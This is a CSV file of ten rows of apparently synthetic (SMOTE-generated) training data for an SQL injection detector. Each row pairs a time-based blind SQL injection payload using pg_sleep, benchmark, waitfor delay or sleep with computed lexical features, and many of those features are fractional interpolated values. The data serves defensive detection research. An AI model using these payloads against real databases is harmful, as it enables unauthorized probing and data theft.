id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,time,1'  )   as irnj where 7274  =  7274 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000396,0.5114536184558357,100.18724978162075,31.703187554594813,3.8401412037872746,32.18724978162076,18.0,38.70318755459481,11.29681244540519,0.3210486403010897,0.17972241874382922,0.3865168997177284,0.11271204123735268,1.0,-1.1102230246251565e-16,2.0,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,5.0,0.0,1.0,0.0,4.296812445405189,1.0,0.0,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,1.296812445405189,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.296812445405189
SMOTE_000002,attack,time,"1  )   as drbw where 2380  =  2380 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000836,0.8087534800052657,97.26642887631277,29.377738146052128,3.8798093291362354,24.133214438156383,29.0,34.13321443815639,10.0,0.24724969490150883,0.29917383052474467,0.35041308473762767,0.10316338983611885,0.0,0.31113092697393613,2.0,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,4.688869073026064,0.0,0.0,1.0,4.0,0.0,0.31113092697393624,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000003,attack,time,"1%""   )    )    waitfor delay '0:0:5'--",nearest_attack_euclidean,R000587,0.2642000966932869,39.489031056482034,20.87774223587949,3.7103553311489517,12.0,4.0,13.489031056482034,10.0,0.3041929799178388,0.10139765997261291,0.340915210178016,0.2534941499315323,2.0,1.0,2.0,0.0,-2.7755575615628914e-17,0.0,8.673617379884035e-19,2.122257764120509,0.8777422358794913,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000004,attack,time,"1'  )   where 4778  =  4778 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000888,0.2504374062044457,76.42802140430305,24.31439571913939,3.428537023096097,16.0,18.0,32.74241712344244,9.68560428086061,0.20954542633142803,0.23573860462285653,0.42805686826171524,0.12665910078400017,1.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,4.68560428086061,0.0,0.0,1.0,2.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000005,attack,time,1'||  (  select 'bwqc' from dual where 6897  =  6897 and sleep  (  5  )  #,nearest_attack_euclidean,R000488,0.1618934050718468,73.93941386347899,30.878827726957994,4.134085243829878,30.939413863478997,10.0,23.0,10.0,0.41843665237497163,0.13524729014535544,0.3110687673343175,0.13524729014535544,3.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,3.0,0.0,0.0,0.0,3.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.9999999999999999,1.0,0.0,1.0,1.0,0.9394138634789961,0.06058613652100392,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000006,attack,time,"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""hiwo"" like ""hiwo",nearest_attack_euclidean,R000545,0.8596426157042653,123.32326919625709,29.64653839251416,3.486422330788259,30.0,21.32326919625708,56.0,16.0,0.24326658301286963,0.17289361775624326,0.4540976216240233,0.12974217760686382,0.0,3.9999999999999996,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,10.0,0.0,0.0,1.0,1.0,0.0,1.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.3232691962570784,0.6767308037429214,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000007,attack,time,"1""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""ilge"" like ""ilge",nearest_attack_euclidean,R000374,0.5788859548335549,107.789843751527,21.84062499389201,2.958956530224718,25.789843751527,10.0,56.0,16.0,0.2392494970253733,0.09277445158227154,0.5195369288607207,0.14843912253163447,0.0,3.9999999999999996,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,10.0,0.0,0.0,1.0,1.0,0.0,1.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7898437515269974,0.21015624847300274,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000008,attack,time,select sleep  (  5  )   and    (    (   3404  =  3404,nearest_attack_euclidean,R000283,0.2600782795777164,54.70927625985644,17.0,2.9898045015853123,14.0,9.0,26.257730216547035,5.451546043309407,0.25864697614767984,0.16627305609493706,0.4761541757960612,0.09892579196132195,0.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,4.451546043309407,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000009,attack,time,waitfor delay '0:0:5'--,nearest_attack_euclidean,R000265,3.0605022374714874,26.597075445436992,19.24817215339812,4.139956005768026,13.798537722718496,2.550365569320376,2.0000000000000036,8.24817215339812,0.5192166371350371,0.10079548633668678,0.07686654854014868,0.3031213279881274,2.0,-1.1102230246251565e-16,2.0,0.0,-2.7755575615628914e-17,0.0,8.673617379884035e-19,0.0,0.0,1.7985377227184958,0.4496344306796239,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000010,attack,time,"1""   )    )    or sleep  (  5  )  #",nearest_attack_euclidean,R000524,0.7656274408232396,34.685593207957524,12.68559320795753,2.4288420889376594,7.0,2.0,20.0,5.6855932079575275,0.20184945171789687,0.057671271919399116,0.5767127191939911,0.16376655716871288,0.0,0.6855932079575282,5.551115123125783e-17,0.0,-2.7755575615628914e-17,0.0,8.673617379884035e-19,4.0,0.0,0.0,0.0,0.0,0.0,0.6855932079575282,2.7755575615628914e-17,1.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
